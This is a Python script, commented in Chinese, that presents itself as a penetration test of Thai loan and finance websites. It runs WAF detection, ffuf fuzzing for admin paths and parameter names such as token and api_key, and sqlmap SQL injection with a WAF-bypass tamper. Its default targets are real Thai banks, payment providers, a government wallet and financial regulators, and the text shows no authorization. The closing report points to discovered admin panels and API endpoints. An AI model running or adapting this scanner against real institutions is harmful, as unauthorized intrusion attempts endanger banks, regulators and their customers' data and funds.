#!/usr/bin/env python
"""
泰国贷款网站渗透测试脚本
专门针对泰国私人贷款和金融平台进行WAF绕过和安全测试
"""

import subprocess
import os
import time
from datetime import datetime

def read_targets():
    """读取目标网站列表"""
    try:
        with open("thai_loan_targets.txt", "r", encoding="utf-8") as f:
            targets = []
            for line in f:
                line = line.strip()
                if line and not line.startswith("#") and line.startswith("http"):
                    targets.append(line)
            return targets
    except FileNotFoundError:
        print("目标文件不存在，使用默认目标列表")
        # 默认目标列表（只包含可访问的）
        return [
            "https://www.krungsri.com",      # 泰京银行 - 可访问
            "https://www.scb.co.th",         # 汇商银行 - 可访问  
            "https://www.money.co.th",       # Money.co.th
            "https://www.finnomena.com",     # Finnomena投资平台
            "https://www.scbeasy.com",       # SCB Easy
            "https://www.paotang.in.th",     # Paotang政府钱包
            "https://www.omise.co",          # Omise支付
            "https://www.2c2p.com",          # 2C2P支付
            "https://www.ascendmoney.com",   # Ascend Money
            "https://www.ktc.co.th",         # KTC信用卡
            "https://www.aeon.co.th",        # Aeon信贷
            "https://www.bot.or.th",         # 泰国银行
            "https://www.sec.or.th",         # 泰国证券交易委员会
            "https://www.oic.or.th",         # 泰国保险委员会
        ]

def test_single_target(target_url):
    """对单个目标进行完整测试"""
    print(f"\n{'='*60}")
    print(f"测试目标: {target_url}")
    print(f"{'='*60}")
    
    results = {}
    
    # 1. WAF检测
    print("\n[1/4] 运行WAF检测...")
    try:
        result = subprocess.run(
            ["python", "wafw00f_cmd.py", target_url],
            capture_output=True,
            text=True,
            timeout=30
        )
        results['waf'] = result.stdout
        print("WAF检测完成")
    except Exception as e:
        results['waf'] = f"错误: {e}"
        print(f"WAF检测失败: {e}")
    
    # 2. 路径发现
    print("\n[2/4] 运行路径模糊测试...")
    try:
        result = subprocess.run(
            ["./ffuf.exe", "-w", "common_paths.txt", "-u", f"{target_url}/FUZZ",
             "-mc", "200,301,302,403,500", "-t", "20", "-timeout", "5"],
            capture_output=True,
            text=True,
            timeout=60
        )
        results['ffuf'] = result.stdout
        print("路径发现完成")
    except Exception as e:
        results['ffuf'] = f"错误: {e}"
        print(f"路径发现失败: {e}")
    
    # 3. 参数测试
    print("\n[3/4] 测试参数污染绕过...")
    try:
        # 使用参数污染技术测试
        test_url = f"{target_url}/?id=1&id=2"
        result = subprocess.run(
            ["./ffuf.exe", "-w", "common_params.txt", "-u", f"{target_url}/?FUZZ=test",
             "-mc", "200", "-t", "10"],
            capture_output=True,
            text=True,
            timeout=30
        )
        results['params'] = result.stdout
        print("参数测试完成")
    except Exception as e:
        results['params'] = f"错误: {e}"
        print(f"参数测试失败: {e}")
    
    # 4. 基础SQL注入测试
    print("\n[4/4] 进行基础SQL注入检测...")
    try:
        result = subprocess.run(
            ["python", "-m", "sqlmap", "-u", f"{target_url}/?id=1", 
             "--batch", "--level=1", "--risk=1", "--tamper", "parameter_pollution_bypass"],
            capture_output=True,
            text=True,
            timeout=60
        )
        results['sqlmap'] = result.stdout
        print("SQL注入检测完成")
    except Exception as e:
        results['sqlmap'] = f"错误: {e}"
        print(f"SQL注入检测失败: {e}")
    
    return results

def create_common_files():
    """创建常用的测试文件"""
    # 常见路径列表
    common_paths = """/
/admin
/login
/dashboard
/api
/v1
/v2
/backend
/panel
/cp
/control
/manager
/user
/member
/account
/secure
/private
/secret
/hidden
/test
/debug
/dev
/staging
/beta
/alpha
/phpmyadmin
/adminer
/webadmin
/cpanel
/whm
/plesk
"""
    
    with open("common_paths.txt", "w", encoding="utf-8") as f:
        f.write(common_paths)
    
    # 常见参数列表
    common_params = """id
user
username
password
email
search
q
query
page
category
product
order
sort
filter
token
key
api
api_key
access_token
session
sess
sid
"""
    
    with open("common_params.txt", "w", encoding="utf-8") as f:
        f.write(common_params)

def generate_report(targets_results):
    """生成详细的测试报告"""
    report = f"""
泰国贷款网站安全测试报告
生成时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
测试目标数量: {len(targets_results)}

测试工具:
- wafw00f: WAF检测
- ffuf: 路径和参数模糊测试
- SQLMap: SQL注入检测
- 参数污染: 高级绕过技术

详细结果:
"""
    
    for target, results in targets_results.items():
        report += f"\n{'='*80}\n"
        report += f"目标: {target}\n"
        report += f"{'='*80}\n"
        
        for tool, result in results.items():
            report += f"\n[{tool.upper()}]\n"
            if result:
                # 提取关键信息
                lines = result.split('\n')
                for line in lines:
                    if any(keyword in line.lower() for keyword in ['waf', 'detected', 'found', 'vulnerable', 'injection', 'admin', 'login']):
                        report += f"  {line}\n"
            else:
                report += "  无结果\n"
    
    # 生成总结
    report += f"\n{'='*80}\n"
    report += "总结和建议:\n"
    report += "1. 重点关注发现的管理后台路径\n"
    report += "2. 参数污染技术对现代WAF可能有效\n"
    report += "3. 建议进一步测试发现的API端点\n"
    report += "4. 关注返回状态码为200、301、403的路径\n"
    
    filename = f"thai_loan_test_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(report)
    
    print(f"\n报告已保存到: {filename}")
    return filename

def main():
    """主函数"""
    print("开始泰国贷款网站渗透测试...")
    
    # 创建测试文件
    print("创建测试文件...")
    create_common_files()
    
    # 读取目标
    print("读取目标列表...")
    targets = read_targets()
    
    if not targets:
        print("未找到有效目标")
        return
    
    print(f"找到 {len(targets)} 个目标")
    
    # 测试每个目标
    targets_results = {}
    for target in targets[:3]:  # 先测试前3个目标
        try:
            results = test_single_target(target)
            targets_results[target] = results
            time.sleep(2)  # 避免请求过于频繁
        except Exception as e:
            print(f"测试 {target} 时出错: {e}")
            targets_results[target] = {"error": str(e)}
    
    # 生成报告
    report_file = generate_report(targets_results)
    print(f"\n测试完成! 报告文件: {report_file}")

if __name__ == "__main__":
    main()